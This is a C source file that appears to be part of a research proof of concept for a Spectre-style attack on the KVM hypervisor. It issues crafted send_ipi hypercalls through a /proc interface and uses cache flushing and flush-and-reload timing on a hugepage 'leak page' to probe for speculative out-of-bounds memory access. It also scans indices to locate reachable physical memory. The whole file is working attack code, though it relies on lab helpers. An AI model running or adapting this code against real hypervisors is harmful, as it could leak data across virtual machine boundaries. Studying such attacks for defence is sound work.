#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "../../include/asm.h"
#include "../../include/flush_and_reload.h"
#include "hypercall.h"

#define LEAK_PAGE_SIZE (2097152) // 2MiB

int hypercall(struct send_ipi_hypercall_opts *opts) {
  const char *hypercall_path = "/proc/hypercall/send_ipi";
  int fd = open(hypercall_path, O_WRONLY);
  if (fd < 0) {
    err(fd, "Failed to open %s", hypercall_path);
  }

  int b = write(fd, opts, 2 * sizeof(*opts));
  close(fd);
  if (b < 0) {
    err(errno, "Failed to write to %s", hypercall_path);
  }
  return b;
}

size_t calculate_min(uintptr_t phys_page_addr, uintptr_t phys_map_addr) {
  // It is below the phys_map, and thus unreachable
  if (phys_page_addr < phys_map_addr) {
    return 0;
  }

  return (phys_page_addr - phys_map_addr) / 8;
}

const size_t upper_bound = 30000;
const size_t lower_bound = 28300;
size_t access_buffer_with_spectre(void *buf, size_t idx) {
  size_t time = 0;

  struct send_ipi_hypercall_opts opts[2] = {0};
  opts[0].mask_low = -1;
  opts[0].min = 0;
  opts[1].mask_low = -1;
  opts[1].min = idx;

  const size_t iters = 3;
  for (size_t i = 0; i < iters; ++i) {
    clflush(buf);
    hypercall(opts);
    time += access_time(buf);
  }

  return time / iters;
}

size_t find_min(void *buf) {
  const uint32_t PAGE_SIZE = 4096;
  const uint32_t MAX_IDX = 0x10000000;
  const uint32_t indices_per_page = PAGE_SIZE / 8;

  for (uint32_t offset = 0; offset < indices_per_page; ++offset) {
    fprintf(stderr, "\r%d / %d", offset, indices_per_page);
    for (uint32_t idx = offset; idx < MAX_IDX; idx += PAGE_SIZE) {
      size_t time = access_buffer_with_spectre(buf, idx);
      if (time < 150) {
        printf("\n\n%x: %ld\n\n", idx, access_buffer_with_spectre(buf, idx));
      }
    }
  }

  return 0;

  // access_buffer_with_spectre(leak_page, min);
}

int main(int argc, char *argv[argc]) {
  if (argc < 2) {
    errno = EINVAL;
    err(errno, "Invalid usage");
  }

  // Spawn the leak page
  void *leak_page =
      mmap(NULL, LEAK_PAGE_SIZE, PROT_READ | PROT_WRITE,
           MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE, 0, 0);
  if (leak_page == (void *)-1) {
    err(errno, "mmap failed");
  }

  // Use this to get physical address of the leak page with the
  // kvm_assist.ko module in the hypervisor
  if (!strncmp(argv[1], "determine", 10)) {
    *(uint64_t *)leak_page = page_value;
    getchar();
    *(uint64_t *)leak_page = 0;
  } else if (!strncmp(argv[1], "calc_min", 9)) {
    if (argc <= 3) {
      errno = EINVAL;
      err(errno, "missing args, requires [phys addr of buf] [phys_map addr]");
    }
    // First, phys addr
    // Second phys map addr

    char *endptr = NULL;
    uintptr_t page_addr = strtoull(argv[2], &endptr, 16);
    if (endptr == argv[2]) {
      errno = EINVAL;
      err(errno, "Could not parse phys addr of page");
    }

    uintptr_t phys_map_addr = strtoull(argv[3], &endptr, 16);
    if (endptr == argv[3]) {
      errno = EINVAL;
      err(EINVAL, "Could not parse phys addr of phys_map");
    }

    size_t min = calculate_min(page_addr, phys_map_addr);
    printf("Min: %ld (or 0x%lx)\n", min, min);
  } else if (!strncmp(argv[1], "find_min", 9)) {
    size_t min = find_min(leak_page);
    printf("Min: %ld (or 0x%lx)\n", min, min);
  }

  munmap(leak_page, LEAK_PAGE_SIZE);
  return 0;
}
